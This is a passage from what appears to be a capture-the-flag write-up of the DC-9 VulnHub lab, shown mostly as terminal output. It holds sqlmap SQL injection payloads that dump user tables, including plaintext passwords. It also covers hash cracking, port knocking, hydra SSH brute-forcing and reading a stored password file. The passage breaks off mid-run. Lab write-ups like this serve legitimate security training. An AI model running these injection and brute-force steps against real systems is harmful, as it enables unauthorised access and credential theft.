class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 02:59:07 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure><h3 id="6-çˆ†å­—æ®µ"><a href="#6-çˆ†å­—æ®µ" class="headerlink" title="6.çˆ†å­—æ®µ"></a>6.çˆ†å­—æ®µ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt -D Staff -T Users --column --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&#x27;]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [<span class="string">&quot;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 03:02:44 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:02:44] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[03:02:44] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[03:02:44] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:02:44] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[03:02:44] [INFO] fetching columns for table &#x27;Users&#x27; in database &#x27;Staff&#x27;</span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">Table: Users</span></span><br><span class="line"><span class="string">[3 columns]</span></span><br><span class="line"><span class="string">+----------+-----------------+</span></span><br><span class="line"><span class="string">| Column   | Type            |</span></span><br><span class="line"><span class="string">+----------+-----------------+</span></span><br><span class="line"><span class="string">| Password | varchar(255)    |</span></span><br><span class="line"><span class="string">| UserID   | int(6) unsigned |</span></span><br><span class="line"><span class="string">| Username | varchar(255)    |</span></span><br><span class="line"><span class="string">+----------+-----------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:02:44] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 03:02:44 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure><h3 id="7-çˆ†æ•°æ®"><a href="#7-çˆ†æ•°æ®" class="headerlink" title="7.çˆ†æ•°æ®"></a>7.çˆ†æ•°æ®</h3><p><code>å¾—åˆ°adminä¸hashå€¼</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt -D Staff -T Users -C Username,Password --dump --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&#x27;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 03:04:03 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:04:03] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[03:04:03] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] fetching entries of column(s) &#x27;Password, Username&#x27; for table &#x27;Users&#x27; in database &#x27;Staff&#x27;</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] recognized possible password hashes in column &#x27;Password&#x27;</span></span><br><span class="line"><span class="string">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N</span></span><br><span class="line"><span class="string">do you want to crack them via a dictionary-based attack? [Y/n/q] Y</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] using hash method &#x27;md5_generic_passwd&#x27;</span></span><br><span class="line"><span class="string">what dictionary do you want to use?</span></span><br><span class="line"><span class="string">[1] default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)</span></span><br><span class="line"><span class="string">[2] custom dictionary file</span></span><br><span class="line"><span class="string">[3] file with list of dictionary files</span></span><br><span class="line"><span class="string">&gt; 1</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] using default dictionary</span></span><br><span class="line"><span class="string">do you want to use common password suffixes? (slow!) [y/N] N</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] starting dictionary-based cracking (md5_generic_passwd)</span></span><br><span class="line"><span class="string">[03:04:03] [INFO] starting 4 processes </span></span><br><span class="line"><span class="string">[03:04:15] [WARNING] no clear password(s) found                                                                                                  </span></span><br><span class="line"><span class="string">Database: Staff</span></span><br><span class="line"><span class="string">Table: Users</span></span><br><span class="line"><span class="string">[1 entry]</span></span><br><span class="line"><span class="string">+----------+----------------------------------+</span></span><br><span class="line"><span class="string">| Username | Password                         |</span></span><br><span class="line"><span class="string">+----------+----------------------------------+</span></span><br><span class="line"><span class="string">| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |</span></span><br><span class="line"><span class="string">+----------+----------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:04:15] [INFO] table &#x27;Staff.Users&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.1.8/dump/Staff/Users.csv&#x27;</span></span><br><span class="line"><span class="string">[03:04:15] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 03:04:15 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure><h3 id="8-å…¶ä»–ç”¨æˆ·ä¿¡æ¯"><a href="#8-å…¶ä»–ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="8.å…¶ä»–ç”¨æˆ·ä¿¡æ¯"></a>8.å…¶ä»–ç”¨æˆ·ä¿¡æ¯</h3><p><code>ä¹‹å‰webç•Œé¢å‘ç°æœ‰ç”¨æˆ·ä¿¡æ¯ï¼Œä¹‹ååˆçˆ†å‡ºusersæ•°æ®åº“ï¼Œæ‰€ä»¥æ¨æµ‹useræ•°æ®åº“å­˜æ”¾çš„æ˜¯ç”¨æˆ·ä¿¡æ¯</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># sqlmap -r demo.txt -D users -T UserDetails -C username,password --dump --batch</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.4.8<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [,]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 03:12:26 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:12:26] [INFO] parsing HTTP request from &#x27;demo.txt&#x27;</span></span><br><span class="line"><span class="string">[03:12:26] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[03:12:26] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: search (POST)</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; AND (SELECT 2109 FROM (SELECT(SLEEP(5)))ucaC) AND &#x27;xHdu&#x27;=&#x27;xHdu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: Generic UNION query (NULL) - 6 columns</span></span><br><span class="line"><span class="string">    Payload: search=1&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170787171,0x765048726464796263436c4a6d764c4652704579707170484f6754656e7547764a50547565464e45,0x71767a7671),NULL,NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:12:26] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span></span><br><span class="line"><span class="string">[03:12:26] [INFO] fetching entries of column(s) &#x27;password, username&#x27; for table &#x27;UserDetails&#x27; in database &#x27;users&#x27;</span></span><br><span class="line"><span class="string">Database: users</span></span><br><span class="line"><span class="string">Table: UserDetails</span></span><br><span class="line"><span class="string">[17 entries]</span></span><br><span class="line"><span class="string">+-----------+---------------+</span></span><br><span class="line"><span class="string">| username  | password      |</span></span><br><span class="line"><span class="string">+-----------+---------------+</span></span><br><span class="line"><span class="string">| marym     | 3kfs86sfd     |</span></span><br><span class="line"><span class="string">| julied    | 468sfdfsd2    |</span></span><br><span class="line"><span class="string">| fredf     | 4sfd87sfd1    |</span></span><br><span class="line"><span class="string">| barneyr   | RocksOff      |</span></span><br><span class="line"><span class="string">| tomc      | TC&amp;TheBoyz    |</span></span><br><span class="line"><span class="string">| jerrym    | B8m#48sd      |</span></span><br><span class="line"><span class="string">| wilmaf    | Pebbles       |</span></span><br><span class="line"><span class="string">| bettyr    | BamBam01      |</span></span><br><span class="line"><span class="string">| chandlerb | UrAG0D!       |</span></span><br><span class="line"><span class="string">| joeyt     | Passw0rd      |</span></span><br><span class="line"><span class="string">| rachelg   | yN72#dsd      |</span></span><br><span class="line"><span class="string">| rossg     | ILoveRachel   |</span></span><br><span class="line"><span class="string">| monicag   | 3248dsds7s    |</span></span><br><span class="line"><span class="string">| phoebeb   | smellycats    |</span></span><br><span class="line"><span class="string">| scoots    | YR3BVxxxw87   |</span></span><br><span class="line"><span class="string">| janitor   | Ilovepeepee   |</span></span><br><span class="line"><span class="string">| janitor2  | Hawaii-Five-0 |</span></span><br><span class="line"><span class="string">+-----------+---------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:12:26] [INFO] table &#x27;users.UserDetails&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.1.8/dump/users/UserDetails.csv&#x27;</span></span><br><span class="line"><span class="string">[03:12:26] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.8&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 03:12:26 /2020-09-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/vulnhub/dc9#</span></span><br></pre></td></tr></table></figure><h2 id="0x05-çˆ†ç ´"><a href="#0x05-çˆ†ç ´" class="headerlink" title="0x05.çˆ†ç ´"></a>0x05.çˆ†ç ´</h2><h3 id="1-ç ´è§£adminå¯†ç ä¸ºtransorbital1"><a href="#1-ç ´è§£adminå¯†ç ä¸ºtransorbital1" class="headerlink" title="1.ç ´è§£adminå¯†ç ä¸ºtransorbital1"></a>1.ç ´è§£adminå¯†ç ä¸º<code>transorbital1</code></h3><img src="/2020/09/02/DC-9/image-20200902151603443.png" class><h2 id="0x06-ç™»å…¥web-application"><a href="#0x06-ç™»å…¥web-application" class="headerlink" title="0x06.ç™»å…¥web application"></a>0x06.ç™»å…¥web application</h2><p><code>å‘ç°æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ¨æµ‹å­˜åœ¨åŒ…å«</code></p><img src="/2020/09/02/DC-9/image-20200902154421208.png" class><p><code>æµ‹è¯•ï¼Œçˆ†ç ´åŒ…å«å‚æ•°ç•¥</code></p><img src="/2020/09/02/DC-9/image-20200902154513168.png" class><p><code>å¯ä»¥çœ‹åˆ°æ•°æ®åº“è·‘å‡ºæ¥çš„ç”¨æˆ·å¯ä»¥è¿›è¡Œç™»å…¥</code></p><p><code>ä½†æ˜¯æœ‰knockdå­˜åœ¨è¿‡æ»¤ï¼Œæ‰€ä»¥æŸ¥çœ‹knockdé…ç½®æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°ä¸‰ä¸ªç”¨æˆ·å¯ä»¥ç™»å…¥</code></p><img src="/2020/09/02/DC-9/image-20200902154938542.png" class><p><code>nmapæµ‹è¯•</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># for x in 7469 8475 9842; do nmap -Pn --max-retries 0 -p $x 192.168.1.8; done</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 03:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00066s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">7469/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.20 seconds</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 03:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">8475/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.19 seconds</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 03:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.8</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">9842/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:D7:7C:A8 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.18 seconds</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x07-çˆ†ç ´ssh"><a href="#0x07-çˆ†ç ´ssh" class="headerlink" title="0x07.çˆ†ç ´ssh"></a>0x07.çˆ†ç ´ssh</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># hydra -L user.txt -P pass.txt 192.168.1.8 ssh</span></span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-02 03:58:38</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.1.8:22/</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: joeyt   password: Passw0rd</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: janitor   password: Ilovepeepee</span><br><span class="line">1 of 1 target successfully completed, 3 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-02 03:59:26</span><br><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>sshç™»å…¥ï¼Œåªåœ¨janitorç”¨æˆ·ä¸‹å‘ç°æœ‰ç”¨çš„æ–‡ä»¶ï¼Œä¸€äº›å¯†ç ã€‚å¹¶ä¸”sudo -læ— æœ</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">janitor@dc-9:~$ ls -la</span><br><span class="line">total 16</span><br><span class="line">drwx------  4 janitor janitor 4096 Sep  2 17:57 .</span><br><span class="line">drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..</span><br><span class="line">lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -&gt; /dev/null</span><br><span class="line">drwx------  3 janitor janitor 4096 Sep  2 17:57 .gnupg</span><br><span class="line">drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin</span><br><span class="line">janitor@dc-9:~$</span><br><span class="line">janitor@dc-9:~$ <span class="built_in">cd</span> .secrets-for-putin/</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$ ls</span><br><span class="line">passwords-found-on-post-it-notes.txt</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt </span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic<span class="comment">#10-4</span></span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br><span class="line">janitor@dc-9:~/.secrets-for-putin$</span><br></pre></td></tr></table></figure><h2 id="0x08-å†æ¬¡çˆ†ç ´ssh"><a href="#0x08-å†æ¬¡çˆ†ç ´ssh" class="headerlink" title="0x08.å†æ¬¡çˆ†ç ´ssh"></a>0x08.å†æ¬¡çˆ†ç ´ssh</h2><p><code>é‡æ–°ç¼–è¾‘å¯†ç å­—å…¸</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># cat pass.txt </span></span><br><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m<span class="comment">#48sd</span></span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72<span class="comment">#dsd</span></span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic<span class="comment">#10-4</span></span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br><span class="line">root@JIYE:~/vulnhub/dc9</span><br></pre></td></tr></table></figure><p><code>å†æ¬¡çˆ†ç ´ï¼Œåˆå‘ç°ä¸€ä¸ªç”¨æˆ·</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/dc9<span class="comment"># hydra -L user.txt -P pass.txt 192.168.1.8 ssh</span></span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-02 04:13:22</span><br><span class="line">[WARNING] Many SSH configurations <span class="built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 391 login tries (l:17/p:23), ~25 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.1.8:22/</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: fredf   password: B4-Tru3-001</span><br><span class="line">[22][ssh] host: 192.168.1.8   login: chandlerb   password: 